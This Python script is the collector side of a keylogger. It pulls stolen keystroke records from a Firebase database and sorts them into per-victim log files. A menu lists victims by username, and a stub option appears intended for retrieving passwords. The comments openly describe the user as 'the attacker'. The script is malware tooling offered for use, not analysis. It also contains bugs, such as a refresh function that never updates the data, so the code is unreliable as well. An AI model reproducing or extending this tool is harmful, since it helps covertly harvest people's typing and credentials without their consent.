from firebase import firebase
import requests

# Firebase API Documentation: https://pypi.org/project/python-firebase/
# make a get request to the firebase server where keylogs are sent
firebase = firebase.FirebaseApplication('https://testunessayproject.firebaseio.com/', None)
result = firebase.get('person', None)

# Description: function to save keystrokes for all users into text files organized by user name
# Parameters: None
# Return: None, just prints out function progress and writes information to the log files
def getAll():
	# loop through all users in database
	for x in result:
		# create a log file based on user's username
		f = result[x]['user'] + "_Log.txt"
		file = open(f, "w", encoding="utf-8")
		
		# loop through all data entries in the user
		for i in result[x]:
			# if you are looking at the keystrokes section, split keystrokes aroung '~'
			if i=="keystroke":
				# write the keystrokes header to the file for the data section
				file.write(i+":\n")
				keys = result[x][i].split("~")
				for j in keys:
					# write each keystroke data (key pressed, time pressed, where it was pressed) to the log file on a new line
					file.write(j + "\n")
			else:
				# split the data around '~'
				aList = result[x][i].split('~')
				temp = []
				# for everything in aList, if the field is not empty, append it to a temporary list
				for j in  aList:
					if j != '':
						temp.append(j)
				aList = temp
				# write the  list to the log file
				file.write(i +':\n' +str(aList) +"\n")
		# add newline character to end of file
		file.write("\n")
	# close the file
	file.close()
	# print done to the terminal to let the attacker know the data has been written to the file
	print('Done\n')

# Description: function to refresh the information retrieved from the database
# Parameters: None
# Return: None
def refresh():
	result = firebase.get('person', None)
	print('Refresh Done\n')

# Description: function to display all user names to the attacker
# Parameters: None
# Return: None
def getUser():
	# refreshing the variable to ensure it is up to date
	refresh()
	
	# print all usernames
	for x in result:
		name = result[x]['user']
		print(name)
	print('done')
	
# Description: function to get keystrokes by username
# Parameters: None
# Return: None
def getByName():
	# refreshing the variable to ensure it is up to date
	refresh()
	
	# display all names to attacker so they can select which user they want to view
	i=0
	for x in result:
		name = result[x]['user']
		print( f'{i} : {name}')
		i += 1
	
	# get which user they want to view
	num = int(input('choose the number: '))

	# loop through all users and if the index matches the number entered by the user, write that information to the appropriate file
	i = 0
	for x in result:
		name = result[x]['user']
		if i == num:
			f = result[x]['user']+"_Log.txt"
			file = open(f, "w", encoding="utf-8")
			for y in result[x]:
				file.write(y+":\n")
				if y=="keystroke":
					keys = result[x][y].split("~")
					for j in keys:
						file.write(j + "\n")
				else:
					file.write(result[x][y]+"\n")
			file.write("\n")
		i += 1
	print('Done\n')

def getPass():
	pass

# run the program
if __name__=='__main__':
	while True:
	
		i = input("0 to get log from all user \n1 to get name of all users \n2 to choose a user for a log file \n3 to get pass\n4 to stop\nEnter: ")
		if i == '0':
			getAll()
		if i == '1':
			getUser()
		if i == '2':
			getByName()
		if i == '3':
			getPass()
		if i=='4':
			break
		if "01234".find(i) == -1:
			print('wrong')

